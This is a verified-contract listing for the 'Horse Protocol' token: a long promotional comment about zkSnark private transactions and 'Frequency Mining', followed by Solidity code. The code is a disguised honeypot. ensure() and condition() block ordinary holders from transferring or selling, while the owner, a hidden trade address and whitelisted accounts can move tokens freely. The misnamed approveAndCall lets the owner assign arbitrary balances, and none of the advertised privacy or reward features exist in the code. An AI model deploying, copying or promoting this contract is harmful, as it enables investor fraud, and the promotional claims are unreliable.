/**
 *Submitted for verification at Etherscan.io on 2021-04-15
*/

/*
Introducing FREQUENCY MINING To The DeFi Ecosystem: See How We Change the Game (A Step By Step Tutorial On How To Earn Deposit Reward On Horse Protocol)

INTRODUCTION AND IMPORTANT ANNOUNCEMENT
Hello HRS community, let the drum roll begin! Today we are here to introduce to the DeFi ecosystem, for the first time ever, a brand new mining system: Frequency Mining, a new term coined by the Horse Protocol team.
But before we talk about Frequency Mining, there are a few important changes that we’d like to address first. Even after the publication of HRS tokenomics article, the team did not stop thinking if there is an even fairer way of launching. Just earlier today, we indeed have come up with an EVEN FAIRER TOKEN DISTRIBUTION for Horse Protocol users. In our old token distribution model, 40% of the HRS tokens are given to LP mining and 40% are given to Frequency Mining (also known as deposit reward), however, this might not be the most ideal way of distributing HRS tokens since Frequency Mining allows users to earn HRS tokens with just ½ of the capital compared to LP mining. Therefore, we have changed the HRS token distribution to 20% LP mining and 60% Frequency Mining, giving users who have less funds better opportunities to earn HRS tokens(users can read the updated tokenomics article here). And this is not the only change we have made, in our previous model, the token emission is reduced by 20% every month. In the new model, this is still true for LP Mining, but different for Frequency Mining. For Frequency Mining, all of the first 1 billion USDT deposits get rewarded with a set standard, making the Frequency Mining as fair and transparent as possible. We will reward each 1k USDT deposit with 1.5 HRS; 10k USDT deposit with 6.75 HRS; and 100k USDT deposit with 60 HRS, adding up to a total of 600,000 HRS tokens. The Frequency Mining (deposit reward) ends when we hit the 1 billion USDT target, users will no longer get rewarded for their deposits after this. These changes are made with our best intention to make sure that everyone, no matter how much money they have, gets a level playing field in participating.
Because of these major improvements, we have to redeploy our contract. And because we have already introduced timelock in our contracts, it will take 24hr for this change to take place, we will have to delay our Frequency Mining (deposits reward) start time for a few hours. The deposit reward’s new starting time will be Friday (March 5th) 7pm EST.
*Important update on March 10th, 2021: Per community suggested, Horse Protocol has decided to move to Frequency Mining v.2. Starting from March 15th, 2021 7pm EST, Horse Protocol will reduce the reward emission rate by 0.2% per 1 million increase in total volume. We strongly encourage readers to read the update here*
FREQUENCY MINING

Users who have been involved with cryptocurrency for a while are probably familiar with the concept of following the whales' wallets. For those of you who don't know, this is when people observe the contract accounts of the ultra-wealthy individuals on block explorers like Bscscan or Etherscan, following their traces to see the tokens that they are purchasing, the protocols they are interacting with. With this feature, people can make their own investment decisions based on the whales' moves. This is like being able to peek inside Elon Musk or Bill Gates' bank accounts and investment portfolios in the CeFi world. Sounds good right? But imagine if people can do that to YOUR accounts too. Imagine being watched and traced every single move you are making on the block. Imagine what people with malicious intentions can do with all this information. The inability to send money to yourself without hundreds of thousands of people staring at you, feels like streaking. And in this case, while you are watching others, you are also being watched. This is the double-edge sword of being in DeFi. While one is in full control of his/her assets, he/she is also in full exposure of his/her assets allocations. But it does not have to be this way.
Horse Protocol, a non custodial and fully private transactions protocol, allows you to enjoy autonomy in the decentralized ecosystems without sacrificing your privacy in exchange. Unstreak yourself with us.
What is so unique about Horse Protocol?
Some of you might wonder, well, isn't there already protocols available that are doing the same things? There's one crucial feature that sets Horse Protocol apart from its peers:
It is the first DeFi tokens private transactions protocol on Ethereum network

Here is a list of tokens that will be included in phase 1 of Horse Protocol's private transactions list. We will kickoff with USDT as the first private transaction token, and add in other tokens to the private transactions program as we progress. If there are tokens with high interest that are not included in the list, HRS tokens holders will be able to vote on proposals to add new tokens to the list.
Crypto: BNB, ETH, BTCB
Stablecoins: USDT, BUSD, USDC, DAI
DeFi: CAKE, XVS, JULD, AUTO, BAKE, BUNNY, ACS
Another key feature of Horse Protocol is its anonymity set liquidity incentive. As a private transactions protocol, the team understands the importance of having a large anonymity set- the larger the anonymity set, the harder it is for observers to tell which accounts and transactions belong to whom. HRS is able to achieve a large anonymity set by providing yield farming as incentives to attract more people to contribute to the liquidity of the anonymity set. Users can earn HRS tokens by staking any token from the tokens list mentioned above in the protocol's anonymity pools. With this incentive, people will be willing to contribute to the anonymity set and the larger the anonymity set, the more users it can attract, which further increases the size of the anonymity set, creating a positive cycle for the protocol.
How do we ensure transaction privacy in Horse Protocol?
Horse Protocol achieves transaction privacy by using the zkSnarks proof, a type of cryptography that allows one party to prove the validity of another party's transactions without disclosing the identity of the senders or information unrelated to the validity of the transactions.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract HorseProtocol {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}